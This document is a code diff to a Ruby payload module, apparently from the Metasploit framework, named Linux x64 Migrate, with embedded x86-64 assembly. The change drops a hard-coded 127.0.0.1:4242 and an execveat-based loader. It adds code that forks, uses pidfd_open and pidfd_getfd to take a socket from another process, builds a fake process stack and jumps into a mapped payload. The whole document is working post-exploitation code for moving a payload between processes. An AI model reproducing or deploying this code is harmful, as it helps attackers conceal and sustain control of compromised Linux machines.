@@ -33,9 +33,9 @@ module Payload::Linux::X64::Migrate
   def generate(opts={})
     
     entry_offset = elf_ep(opts[:payload])
-    encoded_host =  "%.8x" % Rex::Socket.addr_aton("127.0.0.1").unpack("V").first
-    encoded_port = "%.8x" % ["4242".to_i,2].pack("vn").unpack("N").first
     asm = %^
+      push r11
+      xor rax, rax
       push 0x39
       pop rax
       syscall ; fork()
@@ -44,31 +44,48 @@ module Payload::Linux::X64::Migrate
 _exec_parent:
       int 3
 _exec_child:
+      pop r11
+      push r9
+      push r11
+      xchg r10, rdi
       xor rsi, rsi
-      push rsi
-      lea rdi, [rsp]
-      inc rsi
-      mov rax, 0x13f
-      syscall
+      push 0x1b2
+      pop rax
+      syscall ; pidfd_open
+      
+      pop rsi
+      xchg rdi, rax
+      xor rdx, rdx
+      push 0x1b6
+      pop rax
+      syscall  ;pidfd_getfd
+      
+      xchg rdi, rax
+      pop rsi
 
-      mov rdi, rax 
-      mov rdx, #{opts[:payload_length]}
-      xchg rsi, r9
-      xor rax, rax
-      inc rax
-      syscall
+      ; setup stack
+      and rsp, -0x10              ; Align
+      add sp, 80                  ; Add room for initial stack and prog name
+      mov rax, 109                ; prog name "m"
+      push rax                    ;
+      mov rcx, rsp                ; save the stack
+      xor rbx, rbx
+      push rbx                    ; NULL
+      push rbx                    ; AT_NULL
+      push rsi                    ; mmap'd address
+      mov rax, 7                  ; AT_BASE
+      push rax
+      push rbx                    ; end of ENV
+      push rbx                    ; NULL
+      push rdi                    ; ARGV[1] int sockfd
+      push rcx                    ; ARGV[0] char *prog_name
+      mov rax, 2                  ; ARGC
+      push rax
 
-      xor r10, r10
-      xor r8, r8
-      mov r8, 0x1000
-      push r10
-      lea rsi, [rsp]
-      mov eax, 0x142
-      syscall
-
-_wait:
-      nop
-      jmp _wait
+      ; down the rabbit hole
+      mov rax, #{entry_offset}
+      add rsi, rax
+      jmp rsi
 
 ^
 
